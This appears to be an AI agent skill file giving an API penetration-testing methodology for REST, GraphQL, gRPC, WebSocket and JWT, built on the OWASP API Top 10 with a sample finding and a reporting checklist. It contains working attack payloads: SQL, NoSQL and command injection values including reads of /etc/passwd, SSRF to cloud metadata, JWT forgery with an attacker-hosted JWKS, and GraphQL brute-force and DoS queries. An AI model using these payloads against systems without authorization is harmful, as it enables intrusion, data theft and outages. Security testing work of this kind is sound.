---
name: api-security
description: "Comprehensive API security testing skill for REST, GraphQL, gRPC, and WebSocket APIs. This skill should be used when performing API penetration testing, testing for OWASP API Top 10 vulnerabilities, fuzzing API endpoints, testing authentication/authorization, and analyzing API specifications. Triggers on requests to test API security, pentest REST APIs, test GraphQL endpoints, analyze OpenAPI/Swagger specs, or find API vulnerabilities."
---

# API Security Testing

This skill enables comprehensive security testing of APIs including REST, GraphQL, gRPC, and WebSocket protocols. It covers the OWASP API Security Top 10 and provides practical testing methodologies for common API vulnerabilities.

## When to Use This Skill

This skill should be invoked when:
- Performing API penetration testing
- Testing for OWASP API Security Top 10 vulnerabilities
- Fuzzing REST/GraphQL/gRPC endpoints
- Testing API authentication and authorization (BOLA/BFLA)
- Analyzing OpenAPI/Swagger specifications
- Testing JWT/OAuth implementations
- Rate limiting and resource exhaustion testing

### Trigger Phrases
- "test this API for security issues"
- "pentest the REST API"
- "test GraphQL security"
- "check for BOLA/IDOR vulnerabilities"
- "analyze OpenAPI spec for security"
- "test API authentication"
- "fuzz API endpoints"

---

## Prerequisites

### Required Tools

| Tool | Purpose | Installation |
|------|---------|--------------|
| Burp Suite | HTTP interception/testing | PortSwigger download |
| Postman | API testing/automation | postman.com |
| ffuf | API fuzzing | `go install github.com/ffuf/ffuf/v2@latest` |
| nuclei | Vulnerability scanning | `go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest` |
| jwt_tool | JWT analysis | `pip install jwt_tool` |
| graphql-cop | GraphQL scanning | `pip install graphql-cop` |
| arjun | Parameter discovery | `pip install arjun` |
| kiterunner | API endpoint discovery | GitHub release |

---

## OWASP API Security Top 10 (2023)

### Priority Testing Matrix

| Rank | Vulnerability | Impact | Detection |
|------|--------------|--------|-----------|
| API1 | Broken Object Level Authorization (BOLA) | Critical | Manual + Automated |
| API2 | Broken Authentication | Critical | Manual + Tools |
| API3 | Broken Object Property Level Authorization | High | Manual |
| API4 | Unrestricted Resource Consumption | High | Automated |
| API5 | Broken Function Level Authorization (BFLA) | High | Manual |
| API6 | Unrestricted Access to Sensitive Business Flows | High | Manual |
| API7 | Server Side Request Forgery (SSRF) | High | Manual + Automated |
| API8 | Security Misconfiguration | Medium | Automated |
| API9 | Improper Inventory Management | Medium | Discovery |
| API10 | Unsafe Consumption of APIs | Medium | Code Review |

---

## REST API Testing

### Phase 1: Reconnaissance

```bash
# Discover API endpoints from documentation
curl -s https://target.com/api/docs | jq
curl -s https://target.com/swagger.json
curl -s https://target.com/openapi.json
curl -s https://target.com/.well-known/openapi.json

# Fuzz for common API paths
ffuf -u https://target.com/FUZZ -w /path/to/api-wordlist.txt -mc 200,201,204,301,302,401,403

# Common API paths to check
/api/
/api/v1/
/api/v2/
/rest/
/graphql
/graphiql
/api-docs
/swagger
/swagger-ui
/swagger.json
/openapi.json
/.well-known/

# Discover parameters
arjun -u https://target.com/api/users -m GET POST
```

### Phase 2: Authentication Testing

```bash
# JWT Analysis
jwt_tool <token> -T  # Tampering tests
jwt_tool <token> -X a  # Algorithm none attack
jwt_tool <token> -X k  # Key confusion RS256->HS256
jwt_tool <token> -C -d /path/to/wordlist  # Crack weak secret

# OAuth Testing
# 1. Check for open redirect in redirect_uri
# 2. Test state parameter validation
# 3. Test PKCE enforcement
# 4. Check token leakage in referrer

# API Key Testing
# 1. Check if key in URL (leaks in logs)
# 2. Test key rotation
# 3. Check key scoping
# 4. Test revoked key handling
```

### Phase 3: Authorization Testing (BOLA/BFLA)

```markdown
## BOLA (Broken Object Level Authorization) Testing

1. Identify endpoints with object IDs:
   GET /api/users/{id}
   GET /api/orders/{id}
   PUT /api/documents/{id}

2. Create two test accounts (User A, User B)

3. As User A, access own resource:
   GET /api/users/123 -> 200 OK

4. As User A, try accessing User B's resource:
   GET /api/users/456 -> Should be 403, not 200

5. Test ID types:
   - Sequential integers: 1, 2, 3...
   - UUIDs: May seem random but test anyway
   - Encoded IDs: Base64, hex
   - Timestamps: Predictable patterns

## BFLA (Broken Function Level Authorization) Testing

1. Identify privileged endpoints:
   POST /api/admin/users
   DELETE /api/admin/config
   PUT /api/settings/global

2. As regular user, attempt admin actions

3. Test HTTP method switching:
   GET /api/users (allowed) -> POST /api/users (should check auth)

4. Test parameter pollution:
   GET /api/users?role=user -> GET /api/users?role=admin
```

### Phase 4: Input Validation Testing

```bash
# SQL Injection
sqlmap -u "https://target.com/api/users?id=1" --batch --dbs
sqlmap -r request.txt --batch --level 5 --risk 3

# NoSQL Injection payloads
{"username": {"$ne": ""}, "password": {"$ne": ""}}
{"username": {"$gt": ""}, "password": {"$gt": ""}}
{"username": {"$regex": "admin.*"}, "password": {"$ne": ""}}

# Command Injection in API parameters
{"cmd": "; ls -la"}
{"file": "test.txt; cat /etc/passwd"}
{"host": "localhost; whoami"}

# SSRF payloads
{"url": "http://169.254.169.254/latest/meta-data/"}
{"webhook": "http://internal-service:8080/admin"}
{"avatar": "http://localhost:22"}
```

### Phase 5: Rate Limiting & Resource Testing

```bash
# Test rate limiting
for i in {1..1000}; do
  curl -s -o /dev/null -w "%{http_code}\n" \
    "https://target.com/api/login" \
    -d '{"user":"test","pass":"test"}'
done | sort | uniq -c

# Test pagination abuse
GET /api/users?limit=1000000
GET /api/users?page=-1
GET /api/users?offset=999999999

# Test field expansion
GET /api/users?expand=all
GET /api/users?fields=password,secret

# Test batch operations
POST /api/batch [array of 10000 requests]
```

---

## GraphQL Security Testing

### Discovery

```bash
# Common GraphQL endpoints
/graphql
/graphiql
/graphql/console
/graphql-explorer
/v1/graphql

# Introspection query (if enabled)
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "{ __schema { types { name fields { name } } } }"}'

# Using graphql-cop for scanning
graphql-cop -t https://target.com/graphql
```

### GraphQL-Specific Attacks

```graphql
# Introspection Query (full schema)
{
  __schema {
    queryType { name }
    mutationType { name }
    types {
      name
      fields {
        name
        args { name type { name } }
        type { name }
      }
    }
  }
}

# Batching Attack (bypass rate limits)
[
  {"query": "mutation { login(user:\"admin\", pass:\"pass1\") { token } }"},
  {"query": "mutation { login(user:\"admin\", pass:\"pass2\") { token } }"},
  {"query": "mutation { login(user:\"admin\", pass:\"pass3\") { token } }"}
]

# Alias-based DoS
{
  a1: users { id name }
  a2: users { id name }
  a3: users { id name }
  # ... repeat many times
}

# Deep Query DoS
{
  users {
    friends {
      friends {
        friends {
          friends { name }
        }
      }
    }
  }
}

# Directive Overloading
query @skip(if: false) @skip(if: false) @skip(if: false) {
  users { id }
}

# Field Suggestion Exploit
{
  user {
    passwor  # Typo may reveal field exists via suggestions
  }
}
```

### BOLA in GraphQL

```graphql
# Test object-level authorization
query {
  user(id: "other-user-id") {
    email
    ssn
    creditCard
  }
}

# Nested BOLA
query {
  organization(id: "my-org") {
    users {
      # Can I see users from other orgs?
      id email
    }
  }
}

# Mutation BOLA
mutation {
  updateUser(id: "other-user-id", input: { role: "admin" }) {
    id role
  }
}
```

---

## gRPC Security Testing

### Setup

```bash
# Install grpcurl
go install github.com/fullstorydev/grpcurl/cmd/grpcurl@latest

# List services (requires reflection)
grpcurl -plaintext localhost:50051 list

# Describe service
grpcurl -plaintext localhost:50051 describe UserService

# Call method
grpcurl -plaintext -d '{"id": "123"}' localhost:50051 UserService/GetUser
```

### gRPC Testing Areas

```markdown
1. **Authentication**
   - Test metadata/header authentication
   - Check certificate validation (mTLS)
   - Test token handling

2. **Authorization**
   - BOLA on resource IDs
   - Method-level access control
   - Role-based restrictions

3. **Input Validation**
   - Protobuf field validation
   - Type confusion
   - Large message DoS

4. **Reflection**
   - Disable in production
   - Information disclosure via describe

5. **TLS Configuration**
   - Verify TLS is enforced
   - Check certificate pinning
   - Test cipher suites
```

---

## WebSocket Security Testing

### Discovery & Connection

```javascript
// Connect to WebSocket
const ws = new WebSocket('wss://target.com/ws');

ws.onopen = () => {
  console.log('Connected');
  ws.send(JSON.stringify({action: 'subscribe', channel: 'updates'}));
};

ws.onmessage = (event) => {
  console.log('Received:', event.data);
};
```

### WebSocket Attacks

```markdown
1. **Cross-Site WebSocket Hijacking (CSWSH)**
   - Check Origin header validation
   - Test from different domains

2. **Authorization**
   - Subscribe to unauthorized channels
   - Send actions without auth
   - Test BOLA on message IDs

3. **Injection**
   - SQL injection in messages
   - XSS in reflected content
   - Command injection

4. **DoS**
   - Message flooding
   - Large message size
   - Connection exhaustion
```

---

## JWT Security Testing

### Common JWT Attacks

```bash
# Decode JWT
echo "$JWT" | cut -d'.' -f2 | base64 -d 2>/dev/null | jq

# Algorithm None Attack
# Change header to: {"alg": "none", "typ": "JWT"}
# Remove signature

# Key Confusion (RS256 to HS256)
# If server uses RS256, try signing with HS256 using public key

# Weak Secret Cracking
jwt_tool $JWT -C -d /path/to/wordlist.txt
hashcat -a 0 -m 16500 jwt.txt wordlist.txt

# Kid Header Injection
{"alg": "HS256", "typ": "JWT", "kid": "../../dev/null"}
{"alg": "HS256", "typ": "JWT", "kid": "key' UNION SELECT 'secret'--"}

# JKU/X5U Header Injection
{"alg": "RS256", "jku": "https://attacker.com/jwks.json"}
# Host malicious JWKS with your keys

# Expiration Bypass
# Modify exp claim to future date
# Test with expired tokens
```

### JWT Checklist

```markdown
- [ ] Algorithm none vulnerability
- [ ] Key confusion (RS256 -> HS256)
- [ ] Weak HMAC secret
- [ ] Kid header injection (SQLi, path traversal)
- [ ] JKU/X5U URL injection
- [ ] Token expiration not validated
- [ ] Token not invalidated on logout
- [ ] Sensitive data in payload
- [ ] Token reuse after password change
```

---

## API Fuzzing

### Parameter Fuzzing

```bash
# Fuzz parameter values
ffuf -u "https://target.com/api/users?id=FUZZ" \
  -w numbers.txt \
  -H "Authorization: Bearer $TOKEN" \
  -mc 200

# Fuzz JSON body
ffuf -u "https://target.com/api/users" \
  -X POST \
  -H "Content-Type: application/json" \
  -d '{"role": "FUZZ"}' \
  -w roles.txt

# Parameter pollution
GET /api/users?id=1&id=2&id=admin

# Mass assignment
POST /api/users
{"name": "test", "role": "admin", "isAdmin": true}
```

### Endpoint Fuzzing

```bash
# API endpoint discovery
ffuf -u "https://target.com/api/FUZZ" \
  -w api-endpoints.txt \
  -mc 200,201,204,301,302,401,403

# Version fuzzing
ffuf -u "https://target.com/api/FUZZ/users" \
  -w versions.txt  # v1, v2, v3, beta, internal

# HTTP method fuzzing
for method in GET POST PUT PATCH DELETE OPTIONS HEAD TRACE; do
  curl -X $method https://target.com/api/admin -v
done
```

---

## Nuclei API Templates

```bash
# Scan with API-specific templates
nuclei -u https://target.com/api -t exposures/
nuclei -u https://target.com/api -t vulnerabilities/
nuclei -u https://target.com/api -t misconfiguration/

# Scan from OpenAPI spec
nuclei -l endpoints.txt -t api-tests/

# Custom API template
echo 'id: custom-api-test
info:
  name: Custom API Test
  severity: high
requests:
  - method: GET
    path:
      - "{{BaseURL}}/api/admin"
    matchers:
      - type: status
        status:
          - 200' > custom.yaml

nuclei -u https://target.com -t custom.yaml
```

---

## Common Findings Template

### BOLA Finding

```markdown
## [CRITICAL] Broken Object Level Authorization (BOLA)

**Endpoint**: GET /api/v1/users/{id}
**OWASP API**: API1:2023

### Description
The API endpoint allows authenticated users to access other users' data by manipulating the ID parameter without proper authorization checks.

### Evidence
Request as User A (ID: 123):
```
GET /api/v1/users/456 HTTP/1.1
Authorization: Bearer <user_a_token>
```

Response:
```json
{
  "id": 456,
  "email": "userb@example.com",
  "ssn": "XXX-XX-XXXX"
}
```

### Impact
- Access to all user data
- Privacy violation
- Potential for data theft

### Remediation
- Implement object-level authorization checks
- Verify requesting user owns or has access to requested resource
- Use indirect references or verify ownership

### References
- https://owasp.org/API-Security/editions/2023/en/0xa1-broken-object-level-authorization/
```

---

## Reporting Checklist

```markdown
### API Security Assessment Checklist

**Authentication**
- [ ] Authentication mechanism identified
- [ ] Token/session security tested
- [ ] Brute force protection tested
- [ ] Password policies verified

**Authorization**
- [ ] BOLA tested on all endpoints with IDs
- [ ] BFLA tested (privilege escalation)
- [ ] Role-based access verified
- [ ] Horizontal privilege escalation tested

**Input Validation**
- [ ] SQL injection tested
- [ ] NoSQL injection tested
- [ ] Command injection tested
- [ ] XXE tested (if XML accepted)
- [ ] SSRF tested on URL parameters

**Rate Limiting**
- [ ] Rate limiting present
- [ ] Bypass techniques tested
- [ ] Resource exhaustion tested

**Information Disclosure**
- [ ] Verbose errors disabled
- [ ] Stack traces hidden
- [ ] Internal IPs not leaked
- [ ] API versioning secure

**Configuration**
- [ ] HTTPS enforced
- [ ] CORS properly configured
- [ ] Security headers present
- [ ] Debug endpoints disabled
```

---

## Bundled Resources

### scripts/
- `bola_scanner.py` - Automated BOLA testing
- `jwt_analyzer.py` - JWT security analysis
- `graphql_introspection.py` - GraphQL schema extraction
- `api_fuzzer.py` - Parameter and endpoint fuzzing
- `openapi_parser.py` - OpenAPI spec security analysis
- `rate_limit_tester.py` - Rate limiting bypass testing

### references/
- `owasp_api_top10.md` - OWASP API Security Top 10 details
- `jwt_attacks.md` - Comprehensive JWT attack guide
- `graphql_security.md` - GraphQL security testing guide
- `rest_testing.md` - REST API testing methodology

### payloads/
- `sqli_api.txt` - SQL injection payloads for APIs
- `nosql_injection.txt` - NoSQL injection payloads
- `ssrf_payloads.txt` - SSRF test URLs
- `bola_ids.txt` - Common ID patterns for BOLA testing
